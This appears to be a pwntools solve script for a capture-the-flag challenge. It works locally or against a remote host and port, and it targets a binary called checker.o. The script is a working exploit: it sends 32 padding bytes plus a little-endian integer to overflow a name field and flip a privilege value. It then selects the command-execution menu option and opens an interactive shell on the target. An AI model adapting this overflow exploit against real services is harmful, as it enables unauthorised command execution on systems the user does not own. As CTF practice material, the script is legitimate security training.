from pwn import *
# Run as `python3 solve.py REMOTE HOST=<host> PORT=<port>`
# To run locally, run as `python3 solve.py`

if args.REMOTE:
    conn = remote(args.HOST, args.PORT)
else:
    conn = process("./checker.o")

# 0x20 characters for the name
payload = b"A"*0x20
# Representation of 1 as a int
payload += b"\x01\x00\x00\x00"

conn.sendlineafter("Enter your name:", payload)
conn.sendlineafter("> ", "3") # optiont to execute command

# at this point, typing any command e.g. cat flag.txt
# and pressing enter will run the command in the host
conn.interactive()